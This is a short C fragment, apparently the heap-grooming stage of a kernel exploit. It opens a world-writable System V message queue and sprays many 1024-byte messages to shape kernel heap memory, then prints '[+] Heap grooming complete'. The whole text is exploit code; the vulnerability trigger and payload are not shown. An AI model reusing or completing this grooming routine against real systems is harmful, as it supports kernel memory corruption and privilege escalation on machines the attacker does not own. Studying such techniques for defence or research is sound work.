    key_t key = ftok("/tmp", 0x1337);
    int msqid = msgget(key, IPC_CREAT | 0666);
    
    struct {
        long mtype;
        char mtext[1024];
    } msgbuf;
    
    for (int i = 0; i < HEAP_GROOM_SIZE; i++) {
        msgbuf.mtype = 0x1337 + i;
        memset(msgbuf.mtext, 0x41 + (i % 26), sizeof(msgbuf.mtext));
        msgsnd(msqid, &msgbuf, sizeof(msgbuf.mtext), IPC_NOWAIT);
    }
    
    printf("[+] Heap grooming complete\n");
}

